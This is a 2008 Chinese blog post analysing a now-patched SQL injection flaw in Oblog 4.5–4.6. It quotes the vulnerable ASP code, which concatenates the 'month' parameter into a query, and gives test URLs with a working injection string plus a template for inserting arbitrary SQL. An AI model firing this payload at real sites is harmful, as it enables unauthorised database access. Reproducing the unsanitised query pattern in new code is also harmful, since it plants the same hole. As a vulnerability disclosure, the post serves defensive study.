---
title: Oblog最新注入漏洞分析(已修补)
description: Date：2008-5-15Author：Yamato[BCT ]Version：Oblog4.5-4.6sql代码分析：文件In/Class_UserCommand.asp:strMonth=Request("month")//第63行strDay=Request("day")……
date: 2008-07-01 04:43:51
category: 技术文章
tags: ['Oblog', '注入', '漏洞信息', '技术类']
post_id: 537
alias: Oblog-SQL-injection-loophole-latest-Fixes
ViewNums: 3391
---

Date：2008-5-15
Author：Yamato[ [BCT](http://www.cnbct.org/) ]
Version：[Oblog](http://www.oblog.cn/) 4.5-4.6 sql

代码分析：

文件In/Class_UserCommand.asp :

strMonth=Request("month") //第63行

strDay=Request("day")

……

Case "month" //第84行

Dim LastDay

G_P_FileName = G_P_FileName & "month&month=" & strMonth

strDay=Left(strMonth,4) & "-" & Right(strMonth,2) & "-01"

mYear=Left(strMonth,4)

mMonth=Right(strMonth,2)

If InStr ("01,03,05,07,08,10,12",mMonth)> 0 Then

LastDay = "31"……

Else //第109行

SqlPart = " And Addtime >='"&strMonth&"01' AND Addtime < '"&strMonth&LastDay&"' "

构造合适的变量strMonth进行注射

测试方法:

http://localhost/oblog/cmd.asp?do= month&month=2008’ and user>0--01

strDay变量从month中获得日期数据，并判断strDay是否为日期数据。所以构造的注射语句为：

http://localhost/oblog/cmd.asp?do= month&month=2008’(自己的sql语句)--01

执行sql语句采用rst.Open strSql,Conn,1,1

不能修改记录集.

